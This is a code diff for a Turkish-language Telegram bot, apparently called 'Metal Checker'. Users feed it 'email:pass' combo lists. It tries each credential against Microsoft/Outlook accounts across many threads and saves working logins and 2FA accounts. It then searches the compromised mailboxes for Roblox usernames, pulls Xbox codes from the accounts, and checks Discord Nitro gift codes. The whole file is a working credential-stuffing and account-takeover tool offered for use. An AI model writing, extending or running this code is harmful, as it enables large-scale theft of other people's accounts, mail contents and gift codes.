@@ -39,7 +39,7 @@ active_tasks = {}
 stop_flags = {}
 
 # -----------------------------------------
-# 1. CORE CHECKER ENGINE (DOKUNULMADI)
+# 1. CORE CHECKER ENGINE
 # -----------------------------------------
 class UnifiedChecker:
     def __init__(self, keywords=None, api_mode=2, check_mode="both"):
@@ -341,75 +341,9 @@ class UnifiedChecker:
             return {"minecraft_status": "FREE", "minecraft_username": None}
         except: return {"minecraft_status": "ERROR", "minecraft_username": None}
 
-    def GIDD(self, username):
-        url = "https://users.roblox.com/v1/usernames/users"
-        payload = {"usernames": [username], "excludeBannedUsers": False}
-        try:
-            r = requests.post(url, json=payload, timeout=10)
-            if r.status_code == 200 and r.json().get("data"):
-                return r.json()["data"][0]["id"]
-        except: pass
-        return None
-
-    def CSRFFF(self):
-        url = "https://catalog.roblox.com/v1/catalog/items/details"
-        try:
-            r = requests.post(url, json={"items":[]}, timeout=10)
-            return r.headers.get("x-csrf-token")
-        except: return None
-
-    def GSNN(self, asset_ids):
-        if not asset_ids: return []
-        token = self.CSRFFF()
-        if not token: return []
-        url = "https://catalog.roblox.com/v1/catalog/items/details"
-        items = [{"itemType": "Asset", "id": int(aid)} for aid in asset_ids]
-        headers = {"x-csrf-token": token}
-        try:
-            r = requests.post(url, json={"items": items}, headers=headers, timeout=10)
-            if r.status_code == 200:
-                return [item.get("name", "Unknown Item") for item in r.json().get("data", [])]
-        except: pass
-        return []
-
-    def ERUU(self, search_text):
-        patterns = [
-            r'account:\s*([a-zA-Z0-9_]+)',
-            r'for\s+([a-zA-Z0-9_]+)\s+and\s+want',
-            r'account:\s*([a-zA-Z0-9_]+)\.',
-            r'for\s+([a-zA-Z0-9_]+)\.\s+If'
-        ]
-        for pattern in patterns:
-            match = re.search(pattern, search_text, re.IGNORECASE)
-            if match: return match.group(1)
-        return None
-
-    def RLLL(self, username):
-        result = {"username": username, "friends": 0, "banned": "No", "created": "Unknown", "profile": "", "wearing": []}
-        user_id = self.GIDD(username)
-        if not user_id: return None
-        try:
-            user_url = f"https://users.roblox.com/v1/users/{user_id}"
-            user_res = requests.get(user_url, timeout=10)
-            user_data = user_res.json()
-            result["banned"] = "Yes" if user_data.get("isBanned", False) else "No"
-            created_raw = user_data.get("created", "")
-            result["created"] = created_raw.split("T")[0] if created_raw else "Unknown"
-            
-            friends_url = f"https://friends.roblox.com/v1/users/{user_id}/friends/count"
-            friends_res = requests.get(friends_url, timeout=10)
-            if friends_res.status_code == 200: result["friends"] = friends_res.json().get("count", 0)
-            
-            result["profile"] = f"https://www.roblox.com/users/{user_id}/profile"
-            
-            wearing_url = f"https://avatar.roblox.com/v1/users/{user_id}/currently-wearing"
-            wearing_res = requests.get(wearing_url, timeout=10)
-            if wearing_res.status_code == 200:
-                asset_ids = wearing_res.json().get("assetIds", [])
-                result["wearing"] = self.GSNN(asset_ids)
-        except: return None
-        return result
-
+    # -------------------------------------------------------------
+    # YENI ROBLOX CHECKER (OMNI-SEARCH & ROLIMONS API - OB CONFIG)
+    # -------------------------------------------------------------
     def check_roblox(self, email, access_token, cid):
         try:
             search_url = "https://outlook.live.com/search/api/v2/query"
@@ -431,13 +365,37 @@ class UnifiedChecker:
                                 if 'Preview' in result:
                                     full_text += result.get('ItemBody', {}).get('Content', result['Preview']) + " "
                             
-                            roblox_user = self.ERUU(full_text)
-                            if roblox_user:
-                                roblox_data = self.RLLL(roblox_user)
-                                if roblox_data:
-                                    return {"roblox_status": "LINKED", "data": roblox_data}
+                            nick_match = re.search(r'account:\s*([a-zA-Z0-9_]+)', full_text, re.IGNORECASE)
+                            if nick_match:
+                                nick = nick_match.group(1)
+                                
+                                # Omni Search API
+                                omni_res = requests.get(f"https://apis.roblox.com/search-api/omni-search?verticalType=user&searchQuery={nick}", timeout=10).json()
+                                user_id = ""
+                                try:
+                                    search_results = omni_res.get("searchResults", [])
+                                    if search_results:
+                                        user_id = search_results[0].get("contents", [{}])[0].get("id", "")
+                                        if not user_id:
+                                            content_id_match = re.search(r'"contentId":\s*(\d+)', json.dumps(omni_res))
+                                            if content_id_match: user_id = content_id_match.group(1)
+                                except: pass
+                                
+                                if user_id:
+                                    # Users API
+                                    user_res = requests.get(f"https://users.roblox.com/v1/users/{user_id}", timeout=10).json()
+                                    created = user_res.get("created", "").split("T")[0] if "created" in user_res else "Unknown"
+                                    is_banned = user_res.get("isBanned", False)
+                                    
+                                    # Rolimons API
+                                    requests.get(f"https://www.rolimons.com/player/{user_id}", headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
+                                    
+                                    profile_url = f"https://www.roblox.com/users/{user_id}/profile"
+                                    rolimons_url = f"https://www.rolimons.com/player/{user_id}"
+                                    
+                                    return {"roblox_status": "LINKED", "data": {"username": nick, "id": user_id, "created": created, "banned": is_banned, "profile": profile_url, "rolimons": rolimons_url}}
                                 else:
-                                    return {"roblox_status": "LINKED", "data": {"username": roblox_user, "friends": 0, "banned": "Unknown", "created": "Unknown", "profile": "", "wearing": []}}
+                                    return {"roblox_status": "LINKED", "data": {"username": nick, "banned": "Unknown", "created": "Unknown", "profile": "", "rolimons": ""}}
             return {"roblox_status": "FREE", "data": {}}
         except: return {"roblox_status": "ERROR", "data": {}}
 
@@ -844,6 +802,56 @@ class XboxCodeTools:
         return "\n".join(lines) + "\n"
 
 # -----------------------------------------
+# 3. DISCORD NITRO PROMO CHECKER ENGINE
+# -----------------------------------------
+class PromoChecker:
+    def __init__(self):
+        self.session = requests.Session()
+        
+    def check_promo(self, code):
+        try:
+            clean_code = code.strip().split("/")[-1].replace("https:", "").replace("promos.discord.gg", "").replace("discord.com", "").replace("gifts", "").replace("/", "")
+            url = f"https://discord.com/api/v9/entitlements/gift-codes/{clean_code}?with_application=false&with_subscription_plan=true"
+            r = self.session.get(url, timeout=10)
+            if r.status_code == 200:
+                data = r.json()
+                uses = data.get("uses", 0)
+                max_uses = data.get("max_uses", 1)
+                plan = data.get("subscription_plan", {}).get("name", "Unknown Nitro")
+                if uses < max_uses: return {"status": "VALID", "plan": plan, "code": clean_code}
+                else: return {"status": "REDEEMED", "code": clean_code}
+            elif r.status_code == 429: return {"status": "RATE_LIMITED", "code": clean_code}
+            else: return {"status": "INVALID", "code": clean_code}
+        except: return {"status": "ERROR", "code": code}
+
+def run_promo_checker(chat_id, codes):
+    try:
+        bot.send_message(chat_id, f"🔍 {len(codes)} adet Discord Promo Code taranıyor...")
+        checker = PromoChecker()
+        valid_codes = []
+        
+        for code in codes:
+            if stop_flags.get(chat_id, False): break
+            res = checker.check_promo(code)
+            if res["status"] == "VALID":
+                valid_codes.append(f"https://promos.discord.gg/{res['code']} | {res['plan']}")
+            time.sleep(0.5)
+            
+        active_tasks[chat_id] = False
+        user_states[chat_id] = "IDLE"
+        
+        if valid_codes:
+            with open("valid_promos.txt", "w", encoding="utf-8") as f: f.write("\n".join(valid_codes))
+            with open("valid_promos.txt", "rb") as f: bot.send_document(chat_id, f, caption=f"✅ *Taramam Bitti!* {len(valid_codes)} geçerli promo bulundu.", parse_mode="Markdown")
+            os.remove("valid_promos.txt")
+        else:
+            bot.send_message(chat_id, "❌ Maalesef hiç geçerli promo kodu bulunamadı.")
+    except Exception as e:
+        bot.send_message(chat_id, f"❌ Promo Check Hatası: {str(e)}")
+        active_tasks[chat_id] = False
+        user_states[chat_id] = "IDLE"
+
+# -----------------------------------------
 # RESULT MANAGER & LIVE UI
 # -----------------------------------------
 class ResultManager:
@@ -873,7 +881,7 @@ class ResultManager:
         self.sorted_codes_file = os.path.join(self.base_folder, "sorted_codes.txt")
         
     def save_hit(self, res):
-        if self.mode in ["code_fetch", "code_fetch_val", "code_sort"]: return
+        if self.mode in ["code_fetch", "code_fetch_val", "code_sort", "promo_check"]: return
         email, password = res['email'], res['password']
         base_str = f"{email}:{password}"
         with open(self.hits_file, 'a', encoding='utf-8') as f: f.write(base_str + "\n")
@@ -906,12 +914,11 @@ class ResultManager:
                 
         if self.mode in ["roblox", "both"] and res.get("roblox_status") == "LINKED":
             rbx = res.get("roblox_data", {})
-            wearing_str = ", ".join(rbx.get("wearing", []))
-            line = f"{base_str} | Username = {rbx.get('username')} | Friends = {rbx.get('friends')} | Banned = {rbx.get('banned')} | Created = {rbx.get('created')} | Profile = {rbx.get('profile')} | Wearing = [{wearing_str}]"
+            line = f"{base_str} | Username = {rbx.get('username')} | ID = {rbx.get('id', '')} | Banned = {rbx.get('banned')} | Created = {rbx.get('created')} | Profile = {rbx.get('profile')} | Rolimons = {rbx.get('rolimons')}"
             with open(self.roblox_file, 'a', encoding='utf-8') as f: f.write(line + "\n")
 
     def save_2fa(self, email, password):
-        if self.mode in ["code_fetch", "code_fetch_val", "code_sort"]: return
+        if self.mode in ["code_fetch", "code_fetch_val", "code_sort", "promo_check"]: return
         with open(self.two_fa_file, 'a', encoding='utf-8') as f: f.write(f"{email}:{password}\n")
 
     def save_code_result(self, code_line, result_type="fetched"):
@@ -954,7 +961,6 @@ class ResultManager:
             
             if not files_to_send and os.path.exists(self.hits_file): files_to_send.append(self.hits_file)
             return files_to_send, False
-
 
 class LiveStats:
     def __init__(self, total, chat_id, mode):
@@ -1070,7 +1076,7 @@ class LiveStats:
             return text
 
 # -----------------------------------------
-# 3. BACKGROUND PROCESS RUNNERS FOR CODES
+# BACKGROUND PROCESS RUNNERS
 # -----------------------------------------
 def run_code_operations(chat_id, accounts, config):
     try:
@@ -1094,7 +1100,6 @@ def run_code_operations(chat_id, accounts, config):
         tools = XboxCodeTools()
         fetched_codes_list = []
         
-        # 1. FETCH ASAMASI
         def fetch_worker(acc):
             if stop_flags.get(chat_id, False): return
             email, password = acc
@@ -1115,7 +1120,7 @@ def run_code_operations(chat_id, accounts, config):
                                     result_mgr.save_code_result(c, "fetched")
             except: pass
             finally:
-                stats.update("CHECKED") # Sayac artsın diye dummy stat
+                stats.update("CHECKED") 
                 session.close()
 
         with ThreadPoolExecutor(max_workers=config["threads"]) as executor:
@@ -1123,12 +1128,10 @@ def run_code_operations(chat_id, accounts, config):
                 if stop_flags.get(chat_id, False): break
                 executor.submit(fetch_worker, account)
 
-        # 2. VALIDATE ASAMASI (EGER ISTENDIYSE)
         if config["mode"] == "code_fetch_val" and fetched_codes_list and not stop_flags.get(chat_id, False):
-            stats.checked = 0 # Sifirla ki validator tablosu baslasin
+            stats.checked = 0 
             stats.total = len(fetched_codes_list)
             
-            # Kodları checklemek için tek bir valid hesap yakala (örneğin listedeki ilk çalışan hesap)
             val_session = None
             for e, p in accounts:
                 val_session = tools.login_microsoft_account(e, p)
@@ -1172,12 +1175,75 @@ def run_code_operations(chat_id, accounts, config):
         
         if files_to_send:
             for f_path in files_to_send:
-                with open(f_path, 'rb') as f:
-                    bot.send_document(chat_id, f, caption=f"🔥 *METAL CODES - {os.path.basename(f_path)}*", parse_mode="Markdown")
+                with open(f_path, 'rb') as f: bot.send_document(chat_id, f, caption=f"🔥 *METAL CODES - {os.path.basename(f_path)}*", parse_mode="Markdown")
                 try: os.remove(f_path)
                 except: pass
         else:
             bot.send_message(chat_id, "ℹ️ Gönderilecek dosya bulunamadı veya işlem sırasında kod çekilemedi.")
+        
+        try: shutil.rmtree(result_mgr.base_folder)
+        except: pass
+            
+        user_states[chat_id] = "IDLE"
+        
+    except Exception as e:
+        bot.send_message(chat_id, f"❌ Ciddi bir hata oluştu: {str(e)}")
+        active_tasks[chat_id] = False
+        user_states[chat_id] = "IDLE"
+
+def run_checker_operations(chat_id, accounts, config):
+    try:
+        total_accounts = len(accounts)
+        result_mgr = ResultManager(chat_id, config["mode"])
+        stats = LiveStats(total_accounts, chat_id, config["mode"])
+        
+        msg = bot.send_message(chat_id, stats.generate_text(), parse_mode="Markdown")
+        stats.message_id = msg.message_id
+        
+        def ui_updater():
+            while active_tasks.get(chat_id, False):
+                time.sleep(3.0)
+                if not active_tasks.get(chat_id, False): break 
+                try: bot.edit_message_text(stats.generate_text(), chat_id, stats.message_id, parse_mode="Markdown")
+                except: pass
+
+        updater_thread = Thread(target=ui_updater)
+        updater_thread.start()
+
+        def checker_worker(acc):
+            if stop_flags.get(chat_id, False): return
+            email, password = acc
+            checker = UnifiedChecker(check_mode=config["mode"])
+            res = checker.check(email, password)
+            status = res.get("status", "BAD")
+            stats.update(status, res)
+            if status == "HIT":
+                result_mgr.save_hit(res)
+            elif status == "2FA":
+                result_mgr.save_2fa(email, password)
+
+        with ThreadPoolExecutor(max_workers=config.get("threads", 10)) as executor:
+            for account in accounts:
+                if stop_flags.get(chat_id, False): break
+                executor.submit(checker_worker, account)
+
+        active_tasks[chat_id] = False
+        updater_thread.join()
+
+        try: bot.edit_message_text(stats.generate_text() + "\n\n✅ *TARAMA TAMAMLANDI!*", chat_id, stats.message_id, parse_mode="Markdown")
+        except: pass
+
+        bot.send_message(chat_id, "📦 Sonuçlar paketleniyor...")
+        files_to_send, is_zip = result_mgr.get_delivery_files()
+        
+        if files_to_send:
+            for f_path in files_to_send:
+                with open(f_path, 'rb') as f:
+                    bot.send_document(chat_id, f, caption=f"🔥 *METAL CHECKER - HITS*", parse_mode="Markdown")
+                try: os.remove(f_path)
+                except: pass
+        else:
+            bot.send_message(chat_id, "ℹ️ Gönderilecek sonuç bulunamadı.")
         
         try: shutil.rmtree(result_mgr.base_folder)
         except: pass
@@ -1211,18 +1277,11 @@ def run_code_sorter(chat_id, content):
                 game_groups['Other'].append((code_line.strip(), 'Unknown'))
                 
         formatted_output = tools.format_game_codes_output(game_groups)
-        
         filename = "sorted_codes.txt"
-        
-        with open(filename, 'w', encoding='utf-8') as f:
-            f.write(formatted_output)
-            
-        with open(filename, 'rb') as f:
-            bot.send_document(chat_id, f, caption="✅ *Kodlar Başarıyla Sortlandı!*", parse_mode="Markdown")
-            
+        with open(filename, 'w', encoding='utf-8') as f: f.write(formatted_output)
+        with open(filename, 'rb') as f: bot.send_document(chat_id, f, caption="✅ *Kodlar Başarıyla Sortlandı!*", parse_mode="Markdown")
         os.remove(filename)
         user_states[chat_id] = "IDLE"
-        
     except Exception as e:
         bot.send_message(chat_id, f"❌ Sort işlemi başarısız: {str(e)}")
         user_states[chat_id] = "IDLE"
@@ -1260,7 +1319,6 @@ def callback_handler(call):
     chat_id = call.message.chat.id
     data = call.data
     
-    # --- MENUS ---
     if data == "menu_services":
         markup = InlineKeyboardMarkup(row_width=2)
         markup.add(
@@ -1280,11 +1338,11 @@ def callback_handler(call):
         markup.add(
             InlineKeyboardButton("1. Fetch Codes", callback_data="code_fetch"),
             InlineKeyboardButton("2. Fetch & Validate Codes", callback_data="code_fetch_val"),
-            InlineKeyboardButton("3. Sort Codes", callback_data="code_sort")
+            InlineKeyboardButton("3. Sort Codes", callback_data="code_sort"),
+            InlineKeyboardButton("4. Check Nitro Promos", callback_data="promo_check")
         )
         bot.edit_message_text("🎁 *METAL CODES ENGINE*\nSınırsız ve HWID'siz Kod Çekici. Seçimini yap:", chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
 
-    # --- CODE HANDLERS ---
     elif data in ["code_fetch", "code_fetch_val"]:
         user_configs[chat_id]["mode"] = data
         markup = InlineKeyboardMarkup(row_width=3)
@@ -1301,163 +1359,74 @@ def callback_handler(call):
         user_states[chat_id] = "WAITING_FOR_SORT_FILE"
         bot.edit_message_text("📂 *KODLARI SIRALA*\nİçinde daha önceden çektiğin kodların bulunduğu (.txt) formatındaki dosyayı gönder.", chat_id, call.message.message_id, parse_mode="Markdown")
 
-    # --- REGULAR SERVICES HANDLERS ---
+    elif data == "promo_check":
+        user_configs[chat_id]["mode"] = "promo_check"
+        user_states[chat_id] = "WAITING_FOR_PROMOS_FILE"
+        bot.edit_message_text("🎁 *DISCORD PROMO CHECKER*\nİçinde Discord Promo linkleri veya kodları olan (.txt) dosyasını gönder.", chat_id, call.message.message_id, parse_mode="Markdown")
+
     elif data.startswith("srv_"):
         mode = data.split("_")[1]
         user_configs[chat_id]["mode"] = mode
+        user_states[chat_id] = "WAITING_FOR_COMBO"
+        bot.edit_message_text(f"🚀 *{mode.upper()} CHECKER SEÇİLDİ*\nLütfen 'email:pass' formatında bir combo (.txt) gönder.", chat_id, call.message.message_id, parse_mode="Markdown")
         
-        markup = InlineKeyboardMarkup(row_width=1)
-        markup.add(
-            InlineKeyboardButton("1. Full API", callback_data="api_1"),
-            InlineKeyboardButton("2. Fast API (Önerilen)", callback_data="api_2"),
-            InlineKeyboardButton("3. Minimal API", callback_data="api_3")
-        )
-        bot.edit_message_text("⚙️ *API MODE*\nAPI hızı/kalitesi ne olsun?", chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
-        
-    elif data.startswith("api_"):
-        api_lvl = int(data.split("_")[1])
-        user_configs[chat_id]["api"] = api_lvl
-        
-        markup = InlineKeyboardMarkup(row_width=3)
-        markup.add(
-            InlineKeyboardButton("10 Thread", callback_data="thr_10"),
-            InlineKeyboardButton("30 Thread", callback_data="thr_30"),
-            InlineKeyboardButton("50 Thread", callback_data="thr_50"),
-            InlineKeyboardButton("100 Thread", callback_data="thr_100")
-        )
-        bot.edit_message_text("🚀 *THREADING*\nKaç eşzamanlı koldan saldıralım?", chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
-
     elif data.startswith("thr_"):
         threads = int(data.split("_")[1])
         user_configs[chat_id]["threads"] = threads
         user_states[chat_id] = "WAITING_FOR_COMBO"
-        
-        mode_text = user_configs[chat_id]['mode'].upper()
-        bot.edit_message_text(
-            f"✅ *SİSTEM HAZIR!*\n\n"
-            f"Mod: `{mode_text}`\n"
-            f"Threads: `{threads}`\n\n"
-            f"🔥 *Şimdi dosyayı (.txt) veya listeyi gönder.* Geldiği an işlemler otomatik başlayacak. Durdurmak için `/stop` yaz.",
-            chat_id, call.message.message_id, parse_mode="Markdown"
-        )
+        bot.edit_message_text(f"🚀 *{threads} THREAD SEÇİLDİ*\nLütfen 'email:pass' formatında bir combo (.txt) gönder.", chat_id, call.message.message_id, parse_mode="Markdown")
 
-@bot.message_handler(content_types=['document', 'text'])
-def handle_combo(message):
+@bot.message_handler(content_types=['document'])
+def handle_docs(message):
     chat_id = message.chat.id
-    state = user_states.get(chat_id)
+    state = user_states.get(chat_id, "IDLE")
     
-    if state not in ["WAITING_FOR_COMBO", "WAITING_FOR_SORT_FILE"]: return
+    if state == "IDLE":
+        bot.send_message(chat_id, "⚠️ Lütfen önce menüden bir işlem seçin: /start")
+        return
         
-    content = ""
-    if message.content_type == 'document':
+    try:
         file_info = bot.get_file(message.document.file_id)
         downloaded_file = bot.download_file(file_info.file_path)
-        try: content = downloaded_file.decode('utf-8')
-        except:
-            bot.send_message(chat_id, "❌ Dosya okunamadı. UTF-8 formatında geçerli bir txt gönder.")
-            return
-    elif message.content_type == 'text':
-        content = message.text
-
-    if state == "WAITING_FOR_SORT_FILE":
-        run_code_sorter(chat_id, content)
-        return
-
-    # Normal Combo İşlemleri
-    lines = [l.strip() for l in content.split('\n') if l.strip() and ':' in l]
-    if not lines:
-        bot.send_message(chat_id, "❌ Combolar bulunamadı. 'email:pass' formatında bir şeyler at.")
-        return
+        content = downloaded_file.decode('utf-8')
         
-    user_states[chat_id] = "CHECKING"
-    stop_flags[chat_id] = False
-    active_tasks[chat_id] = True
-    config = user_configs[chat_id]
-    
-    # Eğer yeni METAL CODES sistemiyse oraya yönlendir, değilse klasik CHECKER sistemini başlat.
-    if config["mode"] in ["code_fetch", "code_fetch_val"]:
-        accounts = []
-        for line in lines:
-            parts = line.split(':', 1)
-            if len(parts) == 2: accounts.append((parts[0].strip(), parts[1].strip()))
-        
-        Thread(target=run_code_operations, args=(chat_id, accounts, config)).start()
-        return
-
-    # Klasik Checker
-    result_mgr = ResultManager(chat_id, config["mode"])
-    stats = LiveStats(len(lines), chat_id, config["mode"])
-    
-    msg = bot.send_message(chat_id, stats.generate_text(), parse_mode="Markdown")
-    stats.message_id = msg.message_id
-    
-    def process_line(line):
-        if stop_flags.get(chat_id, False): return
-        try:
-            parts = line.split(':', 1)
-            if len(parts) != 2: 
-                stats.update("BAD")
+        if state == "WAITING_FOR_SORT_FILE":
+            bot.send_message(chat_id, "⏳ Dosya alındı, kodlar sortlanıyor...")
+            run_code_sorter(chat_id, content)
+            
+        elif state == "WAITING_FOR_PROMOS_FILE":
+            bot.send_message(chat_id, "⏳ Promo listesi alındı, check işlemi başlıyor...")
+            codes = [line.strip() for line in content.split('\n') if line.strip()]
+            active_tasks[chat_id] = True
+            stop_flags[chat_id] = False
+            Thread(target=run_promo_checker, args=(chat_id, codes)).start()
+            
+        elif state == "WAITING_FOR_COMBO":
+            bot.send_message(chat_id, "⏳ Combo alındı, işleme başlanıyor...")
+            accounts = []
+            for line in content.split('\n'):
+                line = line.strip()
+                if ':' in line:
+                    parts = line.split(':', 1)
+                    accounts.append((parts[0].strip(), parts[1].strip()))
+                    
+            if not accounts:
+                bot.send_message(chat_id, "❌ Dosyada geçerli hesap bulunamadı (email:pass formatı gerekli).")
                 return
-            checker = UnifiedChecker(api_mode=config["api"], check_mode=config["mode"])
-            res = checker.check(parts[0].strip(), parts[1].strip())
-            stats.update(res["status"], res if res["status"] == "HIT" else None)
+                
+            active_tasks[chat_id] = True
+            stop_flags[chat_id] = False
+            config = user_configs.get(chat_id, {"mode": "both", "threads": 10})
             
-            if res["status"] == "HIT": result_mgr.save_hit(res)
-            elif res["status"] == "2FA": result_mgr.save_2fa(parts[0].strip(), parts[1].strip())
-        except: stats.update("ERROR")
-
-    def ui_updater():
-        while active_tasks.get(chat_id, False):
-            time.sleep(2.0)
-            if not active_tasks.get(chat_id, False): break 
-            try: bot.edit_message_text(stats.generate_text(), chat_id, stats.message_id, parse_mode="Markdown")
-            except: pass
-
-    updater_thread = Thread(target=ui_updater)
-    updater_thread.start()
-
-    with ThreadPoolExecutor(max_workers=config["threads"]) as executor:
-        for line in lines:
-            if stop_flags.get(chat_id, False): break
-            executor.submit(process_line, line)
-            
-    active_tasks[chat_id] = False
-    updater_thread.join()
-    
-    try: bot.edit_message_text(stats.generate_text() + "\n\n✅ *TARAMA BİTTİ VEYA DURDURULDU!*", chat_id, stats.message_id, parse_mode="Markdown")
-    except: pass
-    
-    bot.send_message(chat_id, "📦 Sonuçlar paketleniyor (Ayarlarına göre TXT veya ZIP)...")
-    
-    files_to_send, is_zip = result_mgr.get_delivery_files()
-    if is_zip and files_to_send:
-        with open(files_to_send[0], 'rb') as f:
-            bot.send_document(chat_id, f, caption="🔥 *METAL CHECKER - FULL SCAN (.ZIP)*", parse_mode="Markdown")
-    elif files_to_send:
-        for f_path in files_to_send:
-            with open(f_path, 'rb') as f:
-                name_clean = os.path.basename(f_path).replace('_', '\\_')
-                bot.send_document(chat_id, f, caption=f"🔥 *METAL CHECKER - {name_clean}*", parse_mode="Markdown")
-    else:
-        bot.send_message(chat_id, "ℹ️ Hiç hit çıkmadı veya kaydedilecek bir dosya oluşmadı.")
-        
-    try: shutil.rmtree(result_mgr.base_folder)
-    except: pass
-    if is_zip and files_to_send:
-        try: os.remove(files_to_send[0])
-        except: pass
-    
-    user_states[chat_id] = "IDLE"
+            if config["mode"] in ["code_fetch", "code_fetch_val"]:
+                Thread(target=run_code_operations, args=(chat_id, accounts, config)).start()
+            else:
+                Thread(target=run_checker_operations, args=(chat_id, accounts, config)).start()
+                
+    except Exception as e:
+        bot.send_message(chat_id, f"❌ Dosya işlenirken hata oluştu: {str(e)}")
 
 if __name__ == "__main__":
-    print("[DEBUG] Eski oturumlar ve çakışmalar zorla temizleniyor...")
-    try:
-        bot.remove_webhook()
-        time.sleep(1)
-    except Exception as e:
-        print(f"[DEBUG] Webhook temizleme atlandı: {e}")
-        pass
-        
-    print("[DEBUG] Metal Checker v4.0 (Fetcher Edition) Bot Başlatılıyor...")
-    bot.infinity_polling(skip_pending=True, timeout=60, long_polling_timeout=60)
+    print("Bot is running...")
+    bot.polling(none_stop=True)
 
